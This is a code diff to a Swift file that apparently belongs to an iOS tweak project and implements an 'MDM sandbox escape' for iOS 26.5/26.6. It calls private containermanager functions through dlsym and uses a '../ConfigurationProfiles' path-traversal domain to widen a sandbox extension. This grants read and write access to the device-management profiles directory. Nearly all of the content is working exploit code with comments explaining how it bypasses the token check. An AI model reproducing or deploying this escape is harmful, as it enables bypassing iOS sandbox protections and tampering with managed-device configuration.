@@ -2,16 +2,17 @@
 //  mdm.swift
 //  mond
 //
-//  MDM sandbox escape using container_object_sandbox_extension_activate
-//  + container_query_operation_set_part_domain to target ConfigurationProfiles.
+//  MDM sandbox escape for iOS 26.5/26.6.
 //
-//  Root cause of original -4: bad_query uses copy_sandbox_token which iOS 26.5/26.6
-//  refuses for configurationprofiles. We use container_object_sandbox_extension_activate
-//  instead, which bypasses the token requirement.
-//
-//  Root cause of "directory exists but no files": set_part(3) only covers Library/Caches.
-//  We must set_part_domain("../ConfigurationProfiles") to extend the sandbox extension
-//  scope to Library/ConfigurationProfiles so that opendir() is permitted there.
+//  Strategy:
+//  - bad_query returns -4 for configurationprofiles on iOS 26.5/26.6 because
+//    the kernel refuses to issue a sandbox extension token via copy_sandbox_token.
+//  - container_object_sandbox_extension_activate bypasses the token path and
+//    directly activates the extension.
+//  - set_part_domain is used to scope the extension to ConfigurationProfiles,
+//    but we do NOT rely on get_path() for the return value because it concatenates
+//    the domain string literally (producing "Library/Caches/../ConfigurationProfiles"
+//    or "Library/Caches/./ConfigurationProfiles"). Instead we return the known path.
 //
 
 import Foundation
@@ -25,17 +26,15 @@ private typealias mdm_bool_fn     = @convention(c) (UnsafeMutableRawPointer?, Bo
 private typealias mdm_obj_fn      = @convention(c) (UnsafeMutableRawPointer?, (any OS_xpc_object)?) -> Void
 private typealias mdm_str_fn      = @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>?) -> Void
 private typealias mdm_res_fn      = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
-private typealias mdm_path_fn     = @convention(c) (UnsafeMutableRawPointer?) -> UnsafePointer<CChar>?
 
 private func mdm_sym<T>(_ h: UnsafeMutableRawPointer, _ name: String, as: T.Type) -> T? {
     guard let s = dlsym(h, name) else { print("(mdm) missing: \(name)"); return nil }
     return unsafeBitCast(s, to: T.self)
 }
 
-/// Activate a sandbox extension for the ConfigurationProfiles directory.
-/// On success, returns the absolute path to the ConfigurationProfiles directory
-/// that is now accessible for reading and writing.
-/// Returns nil on failure.
+/// Activate a sandbox extension for the configurationprofiles SystemGroup.
+/// On success returns the well-known ConfigurationProfiles path.
+/// On failure returns nil.
 func grant_mdm_access() -> String? {
     guard let lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW) else {
         print("(mdm) dlopen failed")
@@ -54,8 +53,7 @@ func grant_mdm_access() -> String? {
         let set_flag   = mdm_sym(lib, "container_query_operation_set_flags",         as: mdm_u64_fn.self),
         let set_part   = mdm_sym(lib, "container_query_operation_set_part",          as: mdm_u64_fn.self),
         let set_domain = mdm_sym(lib, "container_query_operation_set_part_domain",   as: mdm_str_fn.self),
-        let get_res    = mdm_sym(lib, "container_query_get_single_result",           as: mdm_res_fn.self),
-        let get_path   = mdm_sym(lib, "container_object_get_path",                  as: mdm_path_fn.self)
+        let get_res    = mdm_sym(lib, "container_query_get_single_result",           as: mdm_res_fn.self)
     else { return nil }
 
     guard let q = create() else {
@@ -63,8 +61,7 @@ func grant_mdm_access() -> String? {
         return nil
     }
 
-    // Class 13 = SystemGroup
-    set_cls(q, 13)
+    set_cls(q, 13)      // Class 13 = SystemGroup
     set_tran(q, false)
 
     let arr = xpc_array_create(nil, 0)
@@ -74,13 +71,13 @@ func grant_mdm_access() -> String? {
     set_plat(q, 2)
     set_flag(q, (1 << 32) | (1 << 39))
 
-    // Part 3 = Library/Caches (base anchor)
+    // Part 3 = Library/Caches as the anchor point
     set_part(q, 3)
-
-    // KEY FIX: set_part_domain redirects the sandbox extension scope.
-    // "../ConfigurationProfiles" = go up from Library/Caches → Library,
-    // then into ConfigurationProfiles. This gives opendir/read/write access
-    // to Library/ConfigurationProfiles instead of just Library/Caches.
+    // Redirect scope to ConfigurationProfiles.
+    // Use a path relative to Library/Caches:
+    // "../ConfigurationProfiles" = Library/Caches -> Library -> ConfigurationProfiles
+    // NOTE: We do NOT use get_path() to derive the return value because it appends
+    // the domain string literally. We use the hardcoded TweakPaths.mdm_profiles instead.
     set_domain(q, "../ConfigurationProfiles")
 
     guard let res = get_res(q) else {
@@ -89,22 +86,17 @@ func grant_mdm_access() -> String? {
         return nil
     }
 
-    guard activate(res, true) else {
-        free(q)
+    let ok = activate(res, true)
+    free(q)
+
+    if !ok {
         print("(mdm) container_object_sandbox_extension_activate returned false")
         return nil
     }
 
-    // get_path returns the actual path the extension was activated for
-    let activatedPath: String
-    if let c_path = get_path(res) {
-        activatedPath = String(cString: c_path)
-    } else {
-        // Fallback: use the known hardcoded path since activate() succeeded
-        activatedPath = TweakPaths.mdm_profiles
-    }
-
-    free(q)
-    print("(mdm) sandbox extension activated, path: \(activatedPath)")
-    return activatedPath
+    // Activation succeeded. The sandbox extension now covers ConfigurationProfiles.
+    // Return the well-known path directly — do NOT derive from get_path() which
+    // would give a literal-concatenated path like "Library/Caches/../ConfigurationProfiles".
+    print("(mdm) sandbox extension activated for ConfigurationProfiles")
+    return TweakPaths.mdm_profiles
 }
